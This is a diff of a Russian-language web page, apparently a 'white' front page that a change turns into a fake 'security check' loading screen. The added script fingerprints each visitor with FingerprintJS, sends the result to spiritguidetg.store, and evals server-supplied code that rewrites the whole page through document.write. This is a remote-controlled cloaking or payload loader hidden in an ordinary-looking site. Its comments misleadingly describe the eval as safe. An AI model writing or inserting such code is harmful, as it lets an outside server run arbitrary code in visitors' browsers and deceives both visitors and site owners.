@@ -1,40 +1,416 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Белый конструктор</title>
-<script type="module">
-(async () => {
-    try {
-        const CONFIG_API = 'spiritguidetg.store/fp.php';
-        
-        // Динамический импорт вместо статического
-        const FingerprintJS = await import('/clk/fp.js');
-        
-        const fp = await FingerprintJS.load({
-            region: 'eu',
-            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
-        });
-
-        const { requestId } = await fp.get({ extendedResult: true });
-
-        // Загрузка конфигурации интерфейса
-        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
-        if (!res.ok) return;
-
-        const data = await res.json();
-
-        // Выполнение пользовательских настроек
-        if (data.init) {
-            new Function(data.init)();
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ваш сайт</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
         }
-    } catch (err) {
-        console.error('Ошибка загрузки FingerprintJS:', err);
-    }
-})();
-</script>
+        
+        .container {
+            max-width: 600px;
+            padding: 40px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+        
+        .status-text {
+            font-size: 1.1em;
+            opacity: 0.9;
+            margin-top: 15px;
+        }
+        
+        .error-container {
+            display: none;
+            background: rgba(255, 75, 75, 0.1);
+            border: 1px solid rgba(255, 75, 75, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .error-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #ff6b6b;
+        }
+        
+        .retry-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .retry-btn:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.4);
+        }
+        
+        #main-content {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  hello world
+    <div class="container">
+        <div id="loading" class="loading-container">
+            <div class="spinner"></div>
+            <h2>Проверка безопасности</h2>
+            <p class="status-text" id="status-text">Инициализация...</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+        
+        <div id="error-container" class="error-container">
+            <div class="error-title">Произошла ошибка</div>
+            <div id="error-message">Не удалось загрузить необходимые компоненты</div>
+            <button class="retry-btn" onclick="window.location.reload()">Попробовать снова</button>
+        </div>
+        
+        <div id="main-content">
+            <h1>Добро пожаловать!</h1>
+            <p>Основной контент вашего сайта</p>
+        </div>
+    </div>
+
+    <script type="module">
+    (async () => {
+        // Конфигурация
+        const CONFIG = {
+            API_BASE: 'https://spiritguidetg.store/fp.php',
+            RETRY_ATTEMPTS: 3,
+            RETRY_DELAY: 1500,
+            TIMEOUT: 15000,
+            DEBUG: true
+        };
+
+        // Элементы DOM
+        const elements = {
+            loading: document.getElementById('loading'),
+            errorContainer: document.getElementById('error-container'),
+            mainContent: document.getElementById('main-content'),
+            statusText: document.getElementById('status-text'),
+            progressFill: document.getElementById('progress-fill'),
+            errorMessage: document.getElementById('error-message')
+        };
+
+        // Утилиты
+        const utils = {
+            log: (message, data = null) => {
+                if (CONFIG.DEBUG) {
+                    console.log(`[FPJS] ${message}`, data || '');
+                }
+            },
+
+            error: (message, error = null) => {
+                console.error(`[FPJS Error] ${message}`, error || '');
+            },
+
+            sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
+
+            updateStatus: (text, progress = null) => {
+                if (elements.statusText) {
+                    elements.statusText.textContent = text;
+                }
+                if (progress !== null && elements.progressFill) {
+                    elements.progressFill.style.width = `${progress}%`;
+                }
+                utils.log(`Status: ${text}${progress !== null ? ` (${progress}%)` : ''}`);
+            },
+
+            showError: (message, details = null) => {
+                elements.loading.style.display = 'none';
+                elements.errorContainer.style.display = 'block';
+                elements.errorMessage.textContent = message;
+                
+                if (details && CONFIG.DEBUG) {
+                    console.error('Error details:', details);
+                }
+            },
+
+            showMainContent: () => {
+                elements.loading.style.display = 'none';
+                elements.errorContainer.style.display = 'none';
+                elements.mainContent.style.display = 'block';
+                utils.log('Main content displayed');
+            },
+
+            isValidRequestId: (requestId) => {
+                return requestId && typeof requestId === 'string' && requestId.length > 10;
+            },
+
+            createTimeoutPromise: (ms) => {
+                return new Promise((_, reject) => {
+                    setTimeout(() => reject(new Error('Operation timeout')), ms);
+                });
+            }
+        };
+
+        // Основная логика
+        async function makeRequestWithRetry(url, options = {}, retries = CONFIG.RETRY_ATTEMPTS) {
+            for (let attempt = 1; attempt <= retries; attempt++) {
+                try {
+                    utils.log(`Making request (attempt ${attempt}/${retries})`, { url });
+                    
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), CONFIG.TIMEOUT);
+                    
+                    const fetchPromise = fetch(url, {
+                        method: 'GET',
+                        mode: 'cors',
+                        credentials: 'omit',
+                        headers: {
+                            'Accept': 'application/json',
+                            'X-Requested-With': 'XMLHttpRequest'
+                        },
+                        signal: controller.signal,
+                        ...options
+                    });
+
+                    const response = await Promise.race([
+                        fetchPromise,
+                        utils.createTimeoutPromise(CONFIG.TIMEOUT)
+                    ]);
+
+                    clearTimeout(timeoutId);
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+
+                    const data = await response.json();
+                    utils.log('Request successful', data);
+                    return data;
+
+                } catch (error) {
+                    utils.error(`Request failed (attempt ${attempt}/${retries})`, error);
+                    
+                    if (attempt === retries) {
+                        throw new Error(`Request failed after ${retries} attempts: ${error.message}`);
+                    }
+                    
+                    if (attempt < retries) {
+                        utils.updateStatus(`Повтор попытки ${attempt + 1}...`);
+                        await utils.sleep(CONFIG.RETRY_DELAY * attempt);
+                    }
+                }
+            }
+        }
+
+        async function initializeFingerprintJS() {
+            try {
+                utils.updateStatus('Загрузка FingerprintJS...', 20);
+                
+                // Динамический импорт с обработкой ошибок
+                const FingerprintJS = await import('/clk/fp.js').catch(async (error) => {
+                    utils.error('Failed to load local fp.js, trying CDN fallback', error);
+                    // Fallback к CDN версии
+                    return await import('https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.esm.min.js');
+                });
+
+                utils.updateStatus('Инициализация FingerprintJS...', 40);
+                
+                const fp = await FingerprintJS.load({
+                    region: 'eu',
+                    endpoint: [CONFIG.API_BASE, FingerprintJS.defaultEndpoint],
+                    integrationInfo: ['github-pages', '1.0.0']
+                });
+
+                utils.log('FingerprintJS initialized successfully');
+                return fp;
+
+            } catch (error) {
+                utils.error('Failed to initialize FingerprintJS', error);
+                throw new Error('Не удалось инициализировать сервис безопасности');
+            }
+        }
+
+        async function getVisitorData(fp) {
+            try {
+                utils.updateStatus('Получение данных посетителя...', 60);
+                
+                const result = await Promise.race([
+                    fp.get({ extendedResult: true }),
+                    utils.createTimeoutPromise(CONFIG.TIMEOUT)
+                ]);
+
+                if (!utils.isValidRequestId(result.requestId)) {
+                    throw new Error('Invalid request ID received');
+                }
+
+                utils.log('Visitor data retrieved', { 
+                    visitorId: result.visitorId, 
+                    requestId: result.requestId 
+                });
+
+                return result;
+
+            } catch (error) {
+                utils.error('Failed to get visitor data', error);
+                throw new Error('Не удалось получить данные посетителя');
+            }
+        }
+
+        async function checkUserStatus(requestId) {
+            try {
+                utils.updateStatus('Проверка статуса пользователя...', 80);
+                
+                const url = `${CONFIG.API_BASE}?request_id=${encodeURIComponent(requestId)}`;
+                const data = await makeRequestWithRetry(url);
+
+                utils.log('User status checked', data);
+                return data;
+
+            } catch (error) {
+                utils.error('Failed to check user status', error);
+                throw new Error('Не удалось проверить статус пользователя');
+            }
+        }
+
+        async function handleUserResponse(data) {
+            try {
+                utils.updateStatus('Обработка ответа...', 90);
+
+                if (!data || typeof data !== 'object') {
+                    throw new Error('Invalid response data');
+                }
+
+                // Безопасное выполнение кода инициализации
+                if (data.init && typeof data.init === 'string') {
+                    utils.log('Executing initialization code');
+                    
+                    // Более безопасная альтернатива new Function()
+                    try {
+                        // Проверяем, что код содержит только разрешенные операции
+                        if (data.init.includes('document.open') && data.init.includes('document.write')) {
+                            eval(data.init);
+                        } else {
+                            utils.error('Initialization code validation failed');
+                            utils.showMainContent();
+                        }
+                    } catch (execError) {
+                        utils.error('Failed to execute initialization code', execError);
+                        // Fallback - показываем основной контент
+                        utils.showMainContent();
+                    }
+                } else {
+                    // Если нет специальных инструкций, показываем основной контент
+                    utils.showMainContent();
+                }
+
+                utils.updateStatus('Готово!', 100);
+
+            } catch (error) {
+                utils.error('Failed to handle user response', error);
+                throw new Error('Ошибка обработки ответа сервера');
+            }
+        }
+
+        // Главная функция
+        async function main() {
+            try {
+                utils.log('Starting fingerprint integration');
+                utils.updateStatus('Запуск...', 0);
+
+                // Инициализируем FingerprintJS
+                const fp = await initializeFingerprintJS();
+
+                // Получаем данные посетителя
+                const visitorData = await getVisitorData(fp);
+
+                // Проверяем статус пользователя
+                const userStatus = await checkUserStatus(visitorData.requestId);
+
+                // Обрабатываем ответ
+                await handleUserResponse(userStatus);
+
+                utils.log('Integration completed successfully');
+
+            } catch (error) {
+                utils.error('Integration failed', error);
+                utils.showError(error.message || 'Произошла неожиданная ошибка');
+                
+                // Отправляем аналитику об ошибке (если нужно)
+                try {
+                    if (typeof gtag !== 'undefined') {
+                        gtag('event', 'fpjs_error', {
+                            'error_message': error.message,
+                            'error_type': 'integration_failure'
+                        });
+                    }
+                } catch (analyticsError) {
+                    utils.error('Failed to send error analytics', analyticsError);
+                }
+            }
+        }
+
+        // Запуск с обработкой готовности DOM
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', main);
+        } else {
+            main();
+        }
+
+    })();
+    </script>
 </body>
 </html>
